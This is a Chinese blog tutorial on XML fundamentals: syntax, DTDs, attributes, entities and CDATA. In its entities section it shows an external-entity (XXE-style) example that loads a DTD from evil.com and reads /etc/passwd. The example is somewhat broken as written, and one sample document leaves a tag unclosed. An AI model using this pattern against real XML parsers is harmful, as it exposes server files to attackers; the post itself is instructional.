---
draft: false
date: 2016-05-25 13:59:59
title: XML 基础
description: 
categories:
  - Other
tags:
  - xml
---

### 0x00 XML简介
1、xml的设计宗旨是传输数据，而并非显示数据  
2、xms是不作为的，它被设计用来结构化、存储以及传输信息  
3、xml只是纯文本，独立于软硬件和应用程序  
4、xml可供任何软硬设备读取数据  
5、xml可以自定义标签  
6、xml具有自我描述性  
7、xml是对html的补充  
8、xml常用于简化数据的存储和共享  

### 0x01 XML语法规则
1、所有元素必有闭合标签  
2、标签对大小写敏感  
3、必须正确的嵌套  
4、XML必须有根元素，根节点可以有子节点  
5、XML的属性值必须加引号(能用子元素的就用子元素代替属性)  
6、空格会被保留  
7、XML以LF存储换行  
8、注释使用```<!--   -->```  
9、实体引用  
```html
&lt;  <   小于
&gt;  >   大于
&amp;   &   和号
&apos;  '   单引号
&quot;  "   引号
```

### 0x02 XML格式
```
<?xml version="1.0" encoding="utf-8"?>  <!--xml声明-->

<!--文档类型定义-->
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to       (#PCDATA)> <!-- 定义to标签中元素的类型　-->
  <!ELEMENT from     (#PCDATA)>
  <!ELEMENT heading  (#PCDATA)>
  <!ELEMENT body     (#PCDATA)>
]>

<!--文档元素-->
<note>
  <to>Tom</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Hi,I’am John</body>
</note>
```

### 0x03 XML示例
例子一：John给George的便签
```
<?xml version="1.0" encoding="UTF-8"?>
<note>   <!-- 根元素 -->
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>
```

例子二：传输数据
```
<?xml version="1.0" encoding="UTF-8"?>
<books>
  <book>
    <name>Python黑帽子</name>
    <date>2015</date>
    <price>37￥</price>
    <description>
      用python写一些程序
    </description>
  </book>
  <book>
  <name>Web安全深度剖析</name>
  <date>2014</date>
  <price>39￥</price>
  <description>
    讲述web渗透的基础知识
  </description>
</books>
```

### 0x04 XML属性
对于xml要尽量避免使用属性，作为数据的都尽量使用标签，作为标识的可以作为属性，  
下面两种xml文档包含信息相同，但是推荐第二种
```
<?xml version="1.0" encoding="UTF-8"?>
<messages date="28/08/2008">
  <note id="501"> <!-- ID仅仅是一个标识符，用于标识不同的便签。-->
    <to>George</to>
    <from>John</from>
    <heading>Reminder</heading>
    <body>Don't forget the meeting!</body>
  </note>
  <note id="502">
    <to>John</to>
    <from>George</from>
    <heading>Re: Reminder</heading>
    <body>I will not</body>
  </note> 
</messages>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<messages>
  <date>28/08/2008</date> <!-- date作为数据，所以写入到标签中 -->
  <note id="501">
    <to>George</to>
    <from>John</from>
    <heading>Reminder</heading>
    <body>Don't forget the meeting!</body>
  </note>
  <note id="502">
    <to>John</to>
    <from>George</from>
    <heading>Re: Reminder</heading>
    <body>I will not</body>
  </note> 
</messages>
```

### 0x05 使用实体
实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。  
XML实体分为四种：字符实体，命名实体，外部实体，参数实体。  
可以利用DTD来内部或外部引入实体，DTT基本格式：<!DOCTYPE 根元素名 [  元素描述   ]>

* 内部引入

格式：```<!ENTITY 实体名称 "实体的值">```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY abc "Hello World!">
]>
<root>
    &abc;
</root>
```

* 外部引入

格式：```<!ENTITY 实体名称 SYSTEM "URI">```

evil.dtd中的内容为```<!ENTITY b SYSTEM "file:///etc/passwd">```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY a SYSTEM "http://evil.com/evil.dtd">
]>
<root>
    &b;
</root>
```

### 0x06　CDATA
在 XML 元素中，"<" 和 "&" 是非法的。  
"<" 会产生错误，因为解析器会把该字符解释为新元素的开始。  
"&" 也会产生错误，因为解析器会把该字符解释为字符实体的开始。  
为了避免错误，可以将脚本代码定义为CDATA，CDATA部分中的所有内容都会被解析器忽略。

```
<![CDATA[ <script>alert("test");</script> ]]>
```
